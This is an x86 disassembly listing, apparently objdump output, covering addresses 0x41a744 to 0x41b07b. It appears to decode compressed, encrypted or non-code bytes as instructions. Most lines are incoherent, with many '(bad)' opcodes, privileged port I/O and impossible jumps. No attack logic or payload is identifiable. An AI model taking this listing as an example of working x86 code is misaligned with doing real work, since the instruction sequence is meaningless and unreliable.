  41a744:	imul   edi,DWORD PTR cs:[ebp-0x6f],0x1edc87b5
  41a74c:	imul   edx,DWORD PTR [ebx-0x10eb431],0xffffffb7
  41a753:	jp     0x41a74d
  41a755:	and    DWORD PTR [ebx-0x431c40c2],esi
  41a75b:	dec    ecx
  41a75c:	out    dx,al
  41a75d:	cs mov cl,0xc8
  41a760:	inc    edi
  41a761:	mov    ds:0x7e85429b,eax
  41a766:	sbb    ch,BYTE PTR [eax+0x47]
  41a769:	mov    ah,0x3
  41a76b:	push   0xd0718bac
  41a770:	push   0xffffff9d
  41a772:	or     al,0x94
  41a774:	in     eax,0x65
  41a776:	jge    0x41a71c
  41a778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a779:	pop    es
  41a77a:	pop    ebx
  41a77b:	push   0xfffffffc
  41a77d:	pop    eax
  41a77e:	into   
  41a77f:	aam    0x49
  41a781:	and    al,0x82
  41a783:	push   cs
  41a784:	leave  
  41a785:	in     eax,0x6b
  41a787:	inc    esp
  41a788:	pop    ss
  41a789:	ja     0x41a793
  41a78b:	and    ch,BYTE PTR [ebx]
  41a78d:	jp     0x41a769
  41a78f:	sbb    BYTE PTR [ecx+edx*4+0x69],dl
  41a793:	fisub  DWORD PTR [esi-0x4e]
  41a796:	test   eax,0x843678f0
  41a79b:	ds mov esi,0xb0075622
  41a7a1:	mov    edx,0x19760f86
  41a7a6:	sub    dl,ah
  41a7a8:	adc    BYTE PTR [ebp-0x2ba418dd],dl
  41a7ae:	aad    0xdf
  41a7b0:	mov    ebp,0x1c104c97
  41a7b5:	mov    WORD PTR [ebp-0x15],gs
  41a7b8:	push   esp
  41a7b9:	dec    ebp
  41a7ba:	(bad)
  41a7be:	and    BYTE PTR [ecx],ch
  41a7c0:	ins    BYTE PTR es:[edi],dx
  41a7c1:	aam    0xd5
  41a7c3:	or     eax,0xb004157b
  41a7c8:	add    DWORD PTR [ebx-0x3a],0x746ba27f
  41a7cf:	out    dx,al
  41a7d0:	jbe    0x9aa8214a
  41a7d6:	(bad)  
  41a7d7:	jns    0x41a7c9
  41a7d9:	mov    esi,0x7ef9299e
  41a7de:	jle    0x41a7a2
  41a7e0:	and    edx,eax
  41a7e2:	inc    ecx
  41a7e3:	dec    esp
  41a7e4:	jne    0x41a7ad
  41a7e6:	and    esp,DWORD PTR ds:0x93361e4e
  41a7ec:	add    cl,cl
  41a7ee:	out    0x98,al
  41a7f0:	push   edi
  41a7f1:	out    0xd3,eax
  41a7f3:	inc    ebx
  41a7f4:	push   ds
  41a7f5:	rcr    ebp,0xbd
  41a7f8:	mov    bl,BYTE PTR [edx-0x69]
  41a7fb:	pop    esi
  41a7fc:	and    esp,ebx
  41a7fe:	add    DWORD PTR [ebx+0x5d545849],0x24
  41a805:	pushf  
  41a806:	push   es
  41a807:	fmul   DWORD PTR [esi-0x46bcf408]
  41a80d:	push   0x4a
  41a80f:	jmp    0x41a827
  41a811:	aas    
  41a812:	jp     0x41a87b
  41a814:	ret    0xa63c
  41a817:	and    ebx,esp
  41a819:	movaps xmm6,XMMWORD PTR [edx+0x75]
  41a81d:	adc    eax,0xef6d127d
  41a822:	ja     0x41a811
  41a824:	(bad)  es:[esi-0x4c]
  41a828:	mov    esp,0xda1e6b71
  41a82d:	ja     0x41a871
  41a82f:	cld    
  41a830:	pop    esp
  41a831:	inc    ecx
  41a832:	add    ebp,DWORD PTR [ecx-0x55]
  41a835:	mov    eax,ds:0xeee94dea
  41a83a:	sti    
  41a83b:	pop    ecx
  41a83c:	adc    al,0xf3
  41a83e:	js     0x41a7e4
  41a840:	loopne 0x41a820
  41a842:	or     DWORD PTR [eax+edx*2],0x9840dcfe
  41a849:	gs ret 0x3669
  41a84d:	sbb    DWORD PTR [eax-0x7e5b7da4],ebp
  41a853:	pop    edx
  41a854:	adc    BYTE PTR [ecx],0x93
  41a857:	or     DWORD PTR [edx],ebp
  41a859:	dec    ecx
  41a85a:	test   eax,0xac6898bf
  41a85f:	(bad)  
  41a860:	xchg   ebx,eax
  41a861:	fidiv  WORD PTR [eax+0x56]
  41a864:	cld    
  41a865:	popf   
  41a866:	shl    BYTE PTR [ebx-0x7727723f],0x50
  41a86d:	cli    
  41a86e:	adc    ecx,DWORD PTR [edi+0x7573d949]
  41a874:	icebp  
  41a875:	(bad)
  41a879:	add    bh,BYTE PTR [eax-0x14]
  41a87c:	dec    ecx
  41a87d:	shl    DWORD PTR [ecx-0x136b2c42],0xe8
  41a884:	sbb    dl,0x8
  41a887:	mov    ah,0xb4
  41a889:	mov    al,ds:0x3de9020f
  41a88e:	adc    al,0x9c
  41a890:	test   DWORD PTR [edi+0x46],ebx
  41a893:	outs   dx,BYTE PTR ds:[esi]
  41a894:	scas   al,BYTE PTR es:[edi]
  41a895:	dec    ebx
  41a896:	sub    edi,esp
  41a898:	adc    al,0x8c
  41a89a:	add    BYTE PTR [edx+0x1b845dd8],dl
  41a8a0:	inc    esi
  41a8a1:	sub    DWORD PTR gs:[edx+0x1f],edi
  41a8a5:	jecxz  0x41a8ae
  41a8a7:	pop    esp
  41a8a8:	sbb    DWORD PTR [ebx],0x2e
  41a8ab:	xor    BYTE PTR [ecx],al
  41a8ad:	adc    al,0x64
  41a8af:	nop
  41a8b0:	add    bl,dh
  41a8b2:	fsub   st,st(1)
  41a8b4:	inc    eax
  41a8b5:	test   eax,0x9cfa50d0
  41a8ba:	jecxz  0x41a8c6
  41a8bc:	in     eax,0xfd
  41a8be:	jle    0x41a87e
  41a8c0:	aaa    
  41a8c1:	pop    ebp
  41a8c2:	adc    al,0xa2
  41a8c4:	jl     0x41a875
  41a8c6:	repnz add BYTE PTR [ebp-0x4d],ch
  41a8ca:	add    edx,DWORD PTR [ebp+0x16]
  41a8cd:	inc    eax
  41a8ce:	xor    ax,0x1d41
  41a8d2:	push   eax
  41a8d3:	xchg   cl,dh
  41a8d5:	add    al,0x25
  41a8d7:	fs inc edi
  41a8d9:	inc    ecx
  41a8da:	leave  
  41a8db:	dec    edi
  41a8dc:	inc    ebx
  41a8dd:	inc    eax
  41a8de:	out    0x48,eax
  41a8e0:	ret    
  41a8e1:	pop    es
  41a8e2:	(bad)  
  41a8e3:	jnp    0x41a916
  41a8e5:	inc    edx
  41a8e6:	pop    es
  41a8e7:	xor    esp,DWORD PTR [eax]
  41a8e9:	xor    BYTE PTR [edi-0x1a635e7c],dl
  41a8ef:	pushf  
  41a8f0:	mov    dl,0xef
  41a8f2:	jg     0x41a8fc
  41a8f4:	sbb    al,0x23
  41a8f6:	cs in  al,0xde
  41a8f9:	dec    edx
  41a8fa:	sti    
  41a8fb:	(bad)  
  41a8fc:	fild   WORD PTR [eax+0x5cddec8a]
  41a902:	sub    BYTE PTR [ebx],dh
  41a904:	xchg   ecx,eax
  41a905:	js     0x41a977
  41a907:	sar    DWORD PTR [edi],1
  41a909:	sbb    cl,BYTE PTR [ecx]
  41a90b:	jo     0x41a911
  41a90d:	pushf  
  41a90e:	sub    ebx,ebx
  41a910:	mov    eax,0x82382264
  41a915:	and    esi,eax
  41a917:	cli    
  41a918:	pop    esp
  41a919:	mov    esi,0x92f8e84b
  41a91e:	ja     0x41a973
  41a920:	sbb    al,0x3a
  41a922:	mov    al,0x97
  41a924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a925:	jae    0x41a8e3
  41a927:	test   al,0x77
  41a929:	loope  0x41a901
  41a92b:	outs   dx,BYTE PTR ds:[esi]
  41a92c:	adc    BYTE PTR [edx],ch
  41a92e:	add    DWORD PTR [edi+ecx*2+0x62],ebx
  41a932:	xor    eax,0xb9644982
  41a937:	dec    edx
  41a938:	(bad)  
  41a939:	leave  
  41a93a:	mov    ecx,0xd9d5a73d
  41a93f:	jne    0x41a95b
  41a941:	rol    edi,cl
  41a943:	or     eax,DWORD PTR [ecx+0x3df79d32]
  41a949:	out    dx,eax
  41a94a:	push   ecx
  41a94b:	icebp  
  41a94c:	sahf   
  41a94d:	pop    esp
  41a94e:	adc    eax,edx
  41a950:	push   ss
  41a951:	mov    ch,0x9c
  41a953:	jl     0x41a961
  41a955:	add    al,0x9a
  41a957:	cmp    BYTE PTR [ecx],bh
  41a959:	(bad)  
  41a95a:	cmp    al,0x34
  41a95c:	sbb    edi,DWORD PTR ds:0x78634dda
  41a962:	inc    edi
  41a963:	push   ecx
  41a964:	or     DWORD PTR [edx+0x36],edi
  41a967:	mov    bl,0xb7
  41a969:	retf   0xda3e
  41a96c:	test   BYTE PTR [eax],dh
  41a96e:	sahf   
  41a96f:	sbb    DWORD PTR [edi],edi
  41a971:	gs mov bl,0x2a
  41a974:	inc    eax
  41a975:	test   al,0x51
  41a977:	dec    ebx
  41a978:	test   dl,0x13
  41a97b:	jl     0x41a9b9
  41a97d:	cmc    
  41a97e:	imul   sp,dx,0xff94
  41a982:	mov    al,ds:0x98f8e2af
  41a987:	dec    ebx
  41a988:	jecxz  0x41a98d
  41a98a:	cld    
  41a98b:	pop    eax
  41a98c:	jns    0x41a974
  41a98e:	or     DWORD PTR [edi],eax
  41a990:	jge    0x41a932
  41a992:	add    edx,ebp
  41a994:	mov    WORD PTR [ebp+edx*4-0x68e4e5a0],?
  41a99b:	add    eax,0xf377d1e
  41a9a0:	test   DWORD PTR [edx],edi
  41a9a2:	mov    ebx,0xe676edc1
  41a9a7:	mov    dh,0xe3
  41a9a9:	sbb    BYTE PTR [esi+edi*4],bl
  41a9ac:	inc    ebx
  41a9ad:	jmp    0x4e09:0xad6f189d
  41a9b4:	inc    ebp
  41a9b5:	clc    
  41a9b6:	mov    dh,0x2a
  41a9b8:	and    DWORD PTR [esi-0x26eb83e],esp
  41a9be:	scas   al,BYTE PTR es:[edi]
  41a9bf:	int3   
  41a9c0:	sub    BYTE PTR [edi-0xc],ch
  41a9c3:	mov    esi,0xf7fce2ec
  41a9c8:	test   BYTE PTR ds:0xbcddb565,bl
  41a9ce:	loopne 0x41aa06
  41a9d0:	xor    ebp,DWORD PTR [esi]
  41a9d2:	mov    WORD PTR [ecx-0x36aeeed9],ss
  41a9d8:	(bad)  [ebp+0x5d]
  41a9db:	mov    eax,ds:0x9204389e
  41a9e0:	jnp    0x41aa10
  41a9e2:	lds    eax,FWORD PTR [eax]
  41a9e4:	clc    
  41a9e5:	mov    al,ds:0x8d4358c0
  41a9ea:	adc    edi,DWORD PTR [esi+ebx*8]
  41a9ed:	adc    eax,0xcd3a05a
  41a9f2:	test   BYTE PTR [eax],dl
  41a9f4:	xor    eax,DWORD PTR [ebp+0x39]
  41a9f7:	mov    ah,0x17
  41a9f9:	sub    al,0xc0
  41a9fb:	and    DWORD PTR [edi-0x76b141f6],ebp
  41aa01:	ss je  0x41a98f
  41aa04:	jae    0x41aa02
  41aa06:	xchg   edi,eax
  41aa07:	sub    al,0xa
  41aa09:	rcl    BYTE PTR fs:[eax-0x39da6c0c],1
  41aa10:	sar    DWORD PTR [ebx],0xd
  41aa13:	add    edx,DWORD PTR [edx-0x2c]
  41aa16:	fnstenv [esi]
  41aa18:	fidiv  WORD PTR [edi-0x2c563989]
  41aa1e:	fcom   DWORD PTR [edi+0x3c]
  41aa21:	mov    esp,0x60bab99
  41aa26:	push   esi
  41aa27:	push   ecx
  41aa28:	mov    ds:0xed012e49,al
  41aa2d:	ret    0xdcc9
  41aa30:	ficom  DWORD PTR [edi+ecx*2+0x2]
  41aa34:	add    ebp,edi
  41aa36:	add    edx,ecx
  41aa38:	ins    DWORD PTR es:[edi],dx
  41aa39:	pop    ds
  41aa3a:	add    eax,esp
  41aa3c:	sub    dh,dh
  41aa3e:	or     eax,0x399153f7
  41aa43:	inc    ebp
  41aa44:	or     dl,bh
  41aa46:	out    0x6f,eax
  41aa48:	pushf  
  41aa49:	and    ah,BYTE PTR ds:0x7db0f407
  41aa4f:	pop    ecx
  41aa50:	fstp   QWORD PTR [edi]
  41aa52:	sti    
  41aa53:	int    0x9a
  41aa55:	mov    bh,0x57
  41aa57:	sub    dh,BYTE PTR [ebx]
  41aa59:	push   ebx
  41aa5a:	push   edi
  41aa5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa5c:	jecxz  0x41aa99
  41aa5e:	and    BYTE PTR [eax-0x2d048c99],cl
  41aa64:	aad    0xb2
  41aa66:	sbb    al,0xb4
  41aa68:	jle    0x41aa80
  41aa6a:	ins    DWORD PTR es:[edi],dx
  41aa6b:	pop    ecx
  41aa6c:	mov    WORD PTR [ecx+0x4b],fs
  41aa6f:	sub    al,0xb2
  41aa71:	lds    edi,FWORD PTR [ebx]
  41aa73:	xor    ch,dl
  41aa75:	and    eax,DWORD PTR [ecx]
  41aa77:	ret    0x1bb6
  41aa7a:	out    dx,al
  41aa7b:	jo     0x41aa89
  41aa7d:	pop    ebp
  41aa7e:	push   edx
  41aa80:	dec    edx
  41aa81:	and    edi,DWORD PTR [ecx+0x7f8177e6]
  41aa87:	mov    dl,0x9a
  41aa89:	lahf   
  41aa8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8b:	xchg   edi,eax
  41aa8c:	dec    ebp
  41aa8d:	and    DWORD PTR cs:[eax],ebp
  41aa90:	sti    
  41aa91:	inc    BYTE PTR [edx-0x28]
  41aa94:	mov    edi,0x2ddf9297
  41aa99:	nop
  41aa9a:	pop    es
  41aa9b:	pop    ss
  41aa9c:	clc    
  41aa9d:	imul   DWORD PTR [edi-0x47]
  41aaa0:	jnp    0x41ab0e
  41aaa2:	pop    eax
  41aaa3:	add    BYTE PTR ds:0x7e11ed78,dl
  41aaa9:	test   DWORD PTR [ecx-0x2b1014fd],esp
  41aaaf:	or     BYTE PTR [ebx],cl
  41aab1:	mov    BYTE PTR [ebp-0x3b],ch
  41aab4:	data16 xor dh,BYTE PTR [edi+0x70d7d34f]
  41aabb:	jne    0x41aa61
  41aabd:	xor    eax,DWORD PTR [ebp+0x38c94159]
  41aac3:	mov    al,ds:0xfaa2d47
  41aac8:	stos   DWORD PTR es:[edi],eax
  41aac9:	test   al,0x43
  41aacb:	mov    ah,0x4d
  41aacd:	ins    BYTE PTR es:[edi],dx
  41aace:	push   edx
  41aacf:	ficomp WORD PTR [ebx+0x4c5403db]
  41aad5:	sub    DWORD PTR [ebx+ecx*4-0x241bf8f7],ebx
  41aadc:	imul   ebx,DWORD PTR [esi],0x9e184a
  41aae2:	popa   
  41aae3:	daa    
  41aae4:	dec    edi
  41aae5:	cmp    DWORD PTR [eax+0x16],ecx
  41aae8:	jmp    0x41ab54
  41aaea:	dec    edx
  41aaeb:	jmp    0x957e:0x8d22f3ff
  41aaf2:	pop    esi
  41aaf3:	test   eax,0x8c715edc
  41aaf8:	fsub   DWORD PTR [eax]
  41aafa:	mov    bh,0xb6
  41aafc:	fadd   QWORD PTR [ebx]
  41aafe:	adc    al,0xb1
  41ab00:	gs jmp 0x41ab73
  41ab03:	push   esp
  41ab04:	jns    0x41aaf2
  41ab06:	repnz mov dl,BYTE PTR [ecx+0x5b]
  41ab0a:	leave  
  41ab0b:	adc    bh,BYTE PTR [ebx-0x628e4858]
  41ab11:	scas   al,BYTE PTR es:[edi]
  41ab12:	(bad)  
  41ab13:	ficom  WORD PTR [ecx]
  41ab15:	call   0xa6e99592
  41ab1a:	cmp    al,0x57
  41ab1c:	ja     0x41aaab
  41ab1e:	jp     0x41aafb
  41ab20:	pop    edx
  41ab21:	scas   al,BYTE PTR es:[edi]
  41ab22:	jbe    0x41aab8
  41ab24:	pop    ecx
  41ab25:	push   ebp
  41ab26:	jb     0x41ab67
  41ab28:	pop    edi
  41ab29:	scas   eax,DWORD PTR es:[edi]
  41ab2a:	imul   eax,DWORD PTR [edx-0x71ba80b9],0x4d737ef5
  41ab34:	push   ss
  41ab35:	pop    ds
  41ab36:	mov    ds,WORD PTR [edx]
  41ab38:	iret   
  41ab39:	outs   dx,BYTE PTR ds:[esi]
  41ab3a:	and    DWORD PTR [edx+0x78],esi
  41ab3d:	lds    eax,FWORD PTR [edi-0x6c]
  41ab40:	pop    ds
  41ab41:	cmp    eax,0x20e74969
  41ab46:	or     ch,BYTE PTR [ebx+0x23]
  41ab49:	daa    
  41ab4a:	sar    esp,0xb9
  41ab4d:	push   ecx
  41ab4e:	(bad)  
  41ab4f:	sbb    edx,DWORD PTR [eax-0x4ed7e060]
	...
  41ad29:	inc    ecx
  41ad2a:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41ad31:	push   ecx
  41ad32:	jecxz  0x41ad59
  41ad34:	arpl   si,bp
  41ad36:	push   cs
  41ad37:	xchg   edi,eax
  41ad38:	retf   0x860d
  41ad3b:	add    DWORD PTR [eax],eax
  41ad3d:	and    eax,0x80000007
  41ad42:	or     DWORD PTR [edx+ecx*2-0x2c0ddd62],edi
  41ad49:	push   ds
  41ad4a:	(bad)  
  41ad4b:	mov    ebx,0x731132f7
  41ad50:	add    eax,ebp
  41ad52:	and    DWORD PTR [eax],ebp
  41ad54:	push   0xde3df7b2
  41ad59:	and    dl,cl
  41ad5b:	test   DWORD PTR [ebx],esi
  41ad5d:	sub    DWORD PTR [ebx],0xffffffce
  41ad60:	gs ins BYTE PTR es:[edi],dx
  41ad62:	(bad)  
  41ad63:	mov    esp,0xbe895e4
  41ad68:	push   esi
  41ad69:	xchg   esp,eax
  41ad6a:	xor    ch,BYTE PTR [esi-0x28c67d80]
  41ad70:	and    eax,0xd51d408b
  41ad75:	push   ecx
  41ad76:	add    eax,0x2da56a36
  41ad7b:	aas    
  41ad7c:	xor    DWORD PTR [edx],edi
  41ad7e:	adc    bh,BYTE PTR [edi+esi*4-0x5d47579]
  41ad85:	rol    esp,1
  41ad87:	jno    0x41ad72
  41ad89:	xor    ebp,DWORD PTR [esi-0x5a]
  41ad8c:	das    
  41ad8d:	loope  0x41ad26
  41ad8f:	push   ecx
  41ad90:	xchg   esi,eax
  41ad91:	outs   dx,BYTE PTR ds:[esi]
  41ad92:	mov    edx,DWORD PTR [ecx+0x10b81e11]
  41ad98:	xchg   esp,eax
  41ad99:	scas   al,BYTE PTR es:[edi]
  41ad9a:	stc    
  41ad9b:	fld    QWORD PTR [ebx+0x530998b8]
  41ada1:	pop    eax
  41ada2:	sbb    BYTE PTR [edx+ebx*8+0x7d],dh
  41ada6:	jae    0x41adda
  41ada8:	cmp    bh,BYTE PTR [ebp+0x33989875]
  41adae:	adc    bl,BYTE PTR [edi]
  41adb0:	ins    DWORD PTR es:[edi],dx
  41adb1:	scas   al,BYTE PTR es:[edi]
  41adb2:	push   ss
  41adb3:	mov    bh,BYTE PTR [edi+0x5402054]
  41adb9:	mov    fs,WORD PTR [esi-0x4a]
  41adbc:	cmp    BYTE PTR [esp+ebx*1-0x7f8a75d5],bl
  41adc3:	pop    edx
  41adc4:	inc    edx
  41adc5:	mov    eax,0xd5e5e1ed
  41adca:	clc    
  41adcb:	or     DWORD PTR ds:0x149c68e9,edx
  41add1:	adc    eax,0xe935ad5a
  41add6:	xor    eax,0x1ade50bd
  41addb:	xchg   edx,eax
  41addc:	inc    ebp
  41addd:	mov    edx,0x43932050
  41ade2:	(bad)  
  41ade3:	lahf   
  41ade4:	jno    0x41ae2f
  41ade6:	in     eax,0x77
  41ade8:	add    bh,ah
  41adea:	inc    ebx
  41adeb:	mul    DWORD PTR [ebp-0x489a670c]
  41adf1:	test   DWORD PTR ds:[ecx-0x208801c],esp
  41adf8:	mov    esp,0x5e8ba5d7
  41adfd:	mov    esp,0x8c603963
  41ae02:	jle    0x41ae52
  41ae04:	cmp    DWORD PTR [edx+0x22cee649],ecx
  41ae0a:	gs leave 
  41ae0c:	imul   edi,edx,0xffffffe0
  41ae0f:	inc    esp
  41ae10:	loop   0x41adcd
  41ae12:	xor    BYTE PTR [edi],bl
  41ae14:	test   BYTE PTR [ecx+0x524d011f],cl
  41ae1a:	cmp    DWORD PTR [edx+0x3a],ebx
  41ae1d:	(bad)  
  41ae1e:	lock loop 0x41adaf
  41ae21:	pop    ebx
  41ae22:	aam    0xbe
  41ae24:	pop    ecx
  41ae25:	(bad)  
  41ae26:	or     DWORD PTR [eax-0x41],edi
  41ae29:	nop
  41ae2a:	or     dh,BYTE PTR [ecx+0x16b5dfd8]
  41ae30:	push   ss
  41ae31:	retf   
  41ae32:	les    ebp,FWORD PTR [edi-0x76900b17]
  41ae38:	jo     0x41ade9
  41ae3a:	dec    eax
  41ae3b:	shl    ch,cl
  41ae3d:	(bad)  
  41ae3e:	mov    ebp,0x82d94753
  41ae43:	jb     0x41ade6
  41ae45:	xor    eax,0xd25c0355
  41ae4a:	popf   
  41ae4b:	sar    BYTE PTR [ebp+0x6112e4ce],1
  41ae51:	mov    DWORD PTR [eax-0x57],ebp
  41ae54:	gs push cs
  41ae56:	sub    edi,ebp
  41ae58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae59:	fcomp  QWORD PTR [ebx-0x51a6c4d4]
  41ae5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae60:	fadd   DWORD PTR [ecx+ebp*4+0xd]
  41ae64:	(bad)  
  41ae65:	push   edi
  41ae66:	cld    
  41ae67:	cmp    ebp,DWORD PTR [eax]
  41ae69:	loope  0x41ae6e
  41ae6b:	inc    esi
  41ae6c:	push   ss
  41ae6d:	push   cs
  41ae6e:	pusha  
  41ae6f:	mov    al,ds:0xb3036b8e
  41ae74:	push   ebp
  41ae75:	scas   eax,DWORD PTR es:[edi]
  41ae76:	sub    ebx,edx
  41ae78:	loope  0x41aecc
  41ae7a:	xchg   edx,eax
  41ae7b:	jne    0x41ae85
  41ae7d:	adc    DWORD PTR [esi],eax
  41ae7f:	jne    0x41ae43
  41ae81:	dec    eax
  41ae82:	or     al,0x7f
  41ae84:	test   DWORD PTR [edi+ebp*2],ebx
  41ae87:	(bad)  
  41ae88:	aas    
  41ae89:	jge    0x41aef8
  41ae8b:	int    0x3c
  41ae8d:	push   ss
  41ae8e:	jmp    0x41aef4
  41ae90:	sub    BYTE PTR [esi-0x541ff332],ah
  41ae96:	pop    ebx
  41ae97:	js     0x41aebf
  41ae99:	lea    edx,[edi-0x8]
  41ae9c:	xor    BYTE PTR [esi-0x6603ce34],bh
  41aea2:	sbb    BYTE PTR gs:[edi],0xf
  41aea6:	dec    BYTE PTR [ebp-0x73]
  41aea9:	push   edx
  41aeaa:	test   eax,0x26857c91
  41aeaf:	fs xor eax,0x56aa6340
  41aeb5:	adc    DWORD PTR [edx+ecx*8-0x72],esp
  41aeb9:	adc    DWORD PTR [ebp+edi*8+0x74857d34],ecx
  41aec0:	push   edi
  41aec1:	or     DWORD PTR [ecx-0x46],0x2a
  41aec5:	inc    esp
  41aec6:	adc    esp,DWORD PTR [ecx+0x4d48a5eb]
  41aecc:	mov    ?,WORD PTR [edi-0x669bef87]
  41aed2:	sub    ebx,eax
  41aed4:	xchg   ecx,esi
  41aed6:	dec    edi
  41aed7:	fcmovnbe st,st(2)
  41aed9:	sahf   
  41aeda:	dec    ecx
  41aedb:	push   es
  41aedc:	inc    ebp
  41aedd:	jmp    0x61ff6ab3
  41aee2:	in     al,dx
  41aee3:	repz cmp al,0xd4
  41aee6:	fistp  WORD PTR [ebx-0x5f03b203]
  41aeec:	and    al,0x32
  41aeee:	xlat   BYTE PTR ds:[ebx]
  41aeef:	lods   eax,DWORD PTR ds:[esi]
  41aef0:	or     BYTE PTR [esi+0xf],dl
  41aef3:	mov    dl,0x4d
  41aef5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef7:	ja     0x41ae7e
  41aef9:	loop   0x41ae7f
  41aefb:	iret   
  41aefc:	push   esp
  41aefd:	mov    cl,0x17
  41aeff:	sbb    ch,BYTE PTR [ebp-0x11]
  41af02:	enter  0xe878,0xd2
  41af06:	mov    bh,BYTE PTR [edx]
  41af08:	hlt    
  41af09:	mov    ?,WORD PTR [edx]
  41af0b:	adc    eax,0x24616122
  41af10:	inc    edx
  41af11:	ins    DWORD PTR es:[edi],dx
  41af12:	jmp    ebx
  41af14:	mov    al,ds:0x99d7321b
  41af19:	ds push 0x7a47ff95
  41af1f:	rcr    BYTE PTR [edx+0x5a9969e],0x81
  41af26:	outs   dx,DWORD PTR ds:[esi]
  41af27:	jnp    0x41afa1
  41af29:	rol    BYTE PTR [eax+0x14],1
  41af2c:	add    DWORD PTR [ecx+0x4594574b],edi
  41af32:	add    al,BYTE PTR [esi-0x77]
  41af35:	or     DWORD PTR [eax-0x6c],esp
  41af38:	ffree  st(3)
  41af3a:	or     dh,BYTE PTR [esi]
  41af3c:	dec    eax
  41af3d:	fs xchg esi,eax
  41af3f:	jns    0x41af1c
  41af41:	int    0x76
  41af43:	push   ebx
  41af44:	jne    0x41aef2
  41af46:	and    BYTE PTR [ebx+0x5d],ah
  41af49:	rol    bh,0x6b
  41af4c:	mov    bh,0x8c
  41af4e:	test   al,0x36
  41af50:	sbb    eax,0x8b2a2483
  41af55:	psubusw mm2,QWORD PTR [edi+0x784d8275]
  41af5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af5d:	std    
  41af5e:	ins    DWORD PTR es:[edi],dx
  41af5f:	hlt    
  41af60:	lahf   
  41af61:	test   eax,0xac381b2e
  41af66:	ins    DWORD PTR es:[edi],dx
  41af67:	(bad)  
  41af68:	sbb    al,0x5e
  41af6a:	sub    DWORD PTR [eax],ebx
  41af6c:	ret    0x70de
  41af6f:	xchg   edi,eax
  41af70:	adc    DWORD PTR [ebx+edx*2-0x45ed16f7],esp
  41af77:	inc    ebp
  41af78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af79:	sub    DWORD PTR [esi],ebp
  41af7b:	fucomi st,st(5)
  41af7d:	push   ebp
  41af7e:	adc    DWORD PTR [ebx],ecx
  41af80:	std    
  41af81:	out    dx,al
  41af82:	push   esi
  41af83:	xchg   BYTE PTR [eax-0x6f],bh
  41af86:	dec    eax
  41af87:	icebp  
  41af88:	test   eax,0xf013d3fc
  41af8d:	ret    0xc3db
  41af90:	aas    
  41af91:	push   0xdf4b8280
  41af96:	pop    edi
  41af97:	or     BYTE PTR [ebx+0x1d],0xb3
  41af9b:	inc    esi
  41af9c:	out    dx,eax
  41af9d:	jb     0x41af2f
  41af9f:	pop    esi
  41afa0:	test   eax,ecx
  41afa2:	or     ebp,DWORD PTR [edi+0x27]
  41afa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa6:	inc    ebp
  41afa7:	sub    al,0xe5
  41afa9:	sub    ah,BYTE PTR [ebp+0x5ba3b172]
  41afaf:	push   esp
  41afb0:	into   
  41afb1:	loop   0x41af53
  41afb3:	dec    edx
  41afb4:	mov    esi,0x41401731
  41afb9:	push   ss
  41afba:	inc    ebp
  41afbb:	pop    ds
  41afbc:	pop    ebp
  41afbd:	daa    
  41afbe:	stc    
  41afbf:	int3   
  41afc0:	sub    bh,BYTE PTR [ebx-0x26589ca6]
  41afc6:	pop    esi
  41afc7:	mov    al,0x47
  41afc9:	mov    bh,BYTE PTR [esi-0x22]
  41afcc:	mov    cl,0x64
  41afce:	mov    ecx,0x1c425e44
  41afd3:	iret   
  41afd4:	(bad)  
  41afd5:	jl     0x41afc1
  41afd7:	(bad)  
  41afd8:	cmp    eax,0x13daa1b5
  41afdd:	test   DWORD PTR [edi+0x21],ecx
  41afe0:	scas   al,BYTE PTR es:[edi]
  41afe1:	retf   0x8a65
  41afe4:	outs   dx,BYTE PTR ds:[esi]
  41afe5:	nop
  41afe6:	cmp    BYTE PTR [edx+0x4c006d26],0x64
  41afed:	jmp    0xd58febef
  41aff2:	push   eax
  41aff3:	mov    edx,0x16985b07
  41aff8:	or     DWORD PTR [eax-0x6b077249],0xffffffd3
  41afff:	inc    eax
  41b000:	sbb    DWORD PTR [ebp-0x634abb37],esi
  41b006:	add    dl,al
  41b008:	in     al,0xd5
  41b00a:	dec    esi
  41b00b:	jmp    0x41b01e
  41b00d:	lods   eax,DWORD PTR ds:[esi]
  41b00e:	test   DWORD PTR [esp+edi*4-0x6f0beac1],ebx
  41b015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b016:	shl    dl,1
  41b018:	je     0x41afaf
  41b01a:	mov    bl,ch
  41b01c:	jg     0x41b033
  41b01e:	add    ebp,DWORD PTR [ebx+0x31f98161]
  41b024:	sar    bl,1
  41b026:	push   ecx
  41b027:	fmul   DWORD PTR [ecx-0xf54839e]
  41b02d:	xchg   DWORD PTR [esi-0x37],esp
  41b030:	mov    dl,0x7b
  41b032:	mov    eax,ds:0xb3dd1c4c
  41b037:	add    al,0x98
  41b039:	sub    al,0xe
  41b03b:	push   ebx
  41b03c:	inc    eax
  41b03d:	xchg   esp,eax
  41b03e:	lock (bad) 
  41b040:	fcom   DWORD PTR [ecx+0x36]
  41b043:	clc    
  41b044:	out    0x0,al
  41b046:	xchg   DWORD PTR [ecx-0x77],edi
  41b049:	xchg   edi,eax
  41b04a:	repz dec esp
  41b04c:	out    dx,al
  41b04d:	adc    BYTE PTR [ebx-0x6bb44708],0xfb
  41b054:	mov    cl,0xb5
  41b056:	pushf  
  41b057:	and    eax,0xc36fce67
  41b05c:	cmc    
  41b05d:	iret   
  41b05e:	and    cl,ah
  41b060:	aaa    
  41b061:	jbe    0x41b0cc
  41b063:	shr    BYTE PTR [esi],1
  41b065:	jecxz  0x41b09f
  41b067:	repz xor eax,0xdde267d7
  41b06d:	jo     0x41affb
  41b06f:	aaa    
  41b070:	adc    al,0xfe
  41b072:	outs   dx,DWORD PTR ds:[esi]
  41b073:	add    al,0xc1
  41b075:	fmul   st,st(4)
  41b077:	dec    DWORD PTR [edi+esi*1+0x1a]
  41b07b:	mov    BYTE PTR [edx-0x1deca03a],dh
